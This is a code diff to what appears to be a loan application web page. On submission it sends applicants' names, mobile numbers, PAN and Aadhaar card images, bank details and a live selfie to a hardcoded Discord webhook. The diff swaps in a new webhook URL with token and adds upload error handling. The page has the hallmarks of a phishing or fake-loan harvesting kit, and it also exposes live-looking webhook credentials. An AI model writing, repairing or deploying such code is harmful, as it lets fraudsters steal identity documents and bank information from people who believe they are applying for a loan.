@@ -167,8 +167,8 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // --- DISCORD WEBHOOK URL ---
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1561601570725040228/HNx-tsQAzJzETtLFjDOJonUalwuKPE4iJT84WNtcGuFEH3Ybp5Q0FhznPQEzvBscD6zB";
+        // --- YOUR NEW DISCORD WEBHOOK URL ---
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1561633434420383794/wr24hTxamFvjv1uzyvRhsR65EMzP0bWw2AqdUWd3kZZeaOY8f-m22nedaGYhkRg_bsPY";
 
         let currentApplicationId = null;
         let appListener = null;
@@ -193,12 +193,11 @@
                 ref2Mobile: document.getElementById('ref2Mobile').value
             };
 
-            // Discord Message Format
             const discordPayload = {
                 content: "🚨 **NEW LOAN APPLICATION** 🚨",
                 embeds: [{
                     title: "Application Details",
-                    color: 3447003, // Blue
+                    color: 3447003, 
                     fields: [
                         { name: "👤 Name", value: formData.fullName, inline: true },
                         { name: "📱 Mobile", value: formData.mobile, inline: true },
@@ -213,14 +212,15 @@
             };
 
             try {
-                // 1. Send Text Data to Discord
-                await fetch(DISCORD_WEBHOOK_URL, {
+                // 1. Send Text Data
+                let response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(discordPayload)
                 });
+                if(!response.ok) throw new Error("Discord Text Error: " + response.status);
 
-                // 2. Send Files to Discord
+                // 2. Send Files
                 const filesToSend = [
                     { id: 'filePan', name: 'PAN Card' }, 
                     { id: 'fileAadharFront', name: 'Aadhar Front' }, 
@@ -233,8 +233,8 @@
                         const fd = new FormData();
                         fd.append('payload_json', JSON.stringify({ content: `📄 **${fileObj.name}** - ${formData.fullName}` }));
                         fd.append('file', fileInput.files[0]); 
-                        
-                        await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: fd });
+                        let fileRes = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: fd });
+                        if(!fileRes.ok) throw new Error("File Upload Error. Size might be too big (Max 8MB).");
                     }
                 }
 
@@ -273,7 +273,7 @@
                 content: "🏦 **NEW BANK DETAILS RECEIVED** 🏦",
                 embeds: [{
                     title: "Bank Information",
-                    color: 10181046, // Purple
+                    color: 10181046, 
                     fields: [
                         { name: "👤 Name", value: document.getElementById('fullName').value, inline: true },
                         { name: "🏛️ Bank", value: bankData.bankName, inline: true },
@@ -285,23 +285,22 @@
             };
 
             try {
-                // 1. Send Bank Text Data to Discord
-                await fetch(DISCORD_WEBHOOK_URL, {
+                let response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(discordBankPayload)
                 });
+                if(!response.ok) throw new Error("Discord Bank Error: " + response.status);
 
-                // 2. Send Selfie to Discord
                 const selfieInput = document.getElementById('fileSelfie');
                 if (selfieInput.files && selfieInput.files.length > 0) { 
                     const fd = new FormData(); 
                     fd.append('payload_json', JSON.stringify({ content: `📸 **Live Selfie** - ${document.getElementById('fullName').value}` }));
                     fd.append('file', selfieInput.files[0]); 
-                    await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: fd }); 
+                    let fileRes = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: fd }); 
+                    if(!fileRes.ok) throw new Error("Selfie Upload Error. Image size might be too big.");
                 }
 
-                // 3. Update Firebase
                 database.ref('applications/' + currentApplicationId).update({ ...bankData });
 
                 document.getElementById('loadingOverlay').classList.remove('active');
